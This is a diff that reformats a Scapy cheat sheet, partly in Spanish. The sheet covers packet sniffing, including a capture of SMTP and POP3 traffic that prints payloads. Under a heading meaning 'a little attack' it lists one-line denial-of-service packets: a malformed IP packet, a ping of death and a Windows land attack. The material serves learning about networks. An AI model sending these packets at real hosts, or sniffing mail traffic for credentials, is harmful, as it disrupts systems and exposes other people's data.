@@ -18,19 +18,19 @@ Sniffing:
  
 Sniffing on eth0:
 ```python
-			sniff(iface="eth0",prn=lambda x: x.summary())
-			sniff(iface="eth0",prn=lambda x: x.show())
+    sniff(iface="eth0",prn=lambda x: x.summary())
+    sniff(iface="eth0",prn=lambda x: x.show())
 ```
 	
 Formated sniff output
 ```python
-			pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))
+    pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))
 ```
 	
-identificando puertos
-	```python
-		a=sniff(filter="tcp and ( port 25 or port 110 )",prn=lambda x: x.sprintf("%IP.src%:%TCP.sport% -> %IP.dst%:%TCP.dport%  %2s,TCP.flags% : %TCP.payload%"))
-	```
+Identify ports
+```python
+    a=sniff(filter="tcp and ( port 25 or port 110 )",prn=lambda x: x.sprintf("%IP.src%:%TCP.sport% -> %IP.dst%:%TCP.dport%  %2s,TCP.flags% : %TCP.payload%"))
+```
  
 Ping:
 ```python
@@ -97,18 +97,19 @@ OS fingerprint:
 un ataquesillo:
 	paquete mal formado:
 	
-	```python
-		send(IP(dst="192.168.1.1", ihl=2, version=3)/ICMP())
-	```
+```python
+    send(IP(dst="192.168.1.1", ihl=2, version=3)/ICMP())
+```
 	
-	Ping of death:
-	```python
-		send( fragment(IP(dst="192.168.1.1")/ICMP()/("X"*60000)) )
-	```
-	Land attack (windows):
-	```python
-		send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
-	```
+Ping of death:
+```python
+    send( fragment(IP(dst="192.168.1.1")/ICMP()/("X"*60000)) )
+```
+
+Land attack (windows):
+```python
+    send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
+```
  
 verificandos DHCP de la red:
 ```python
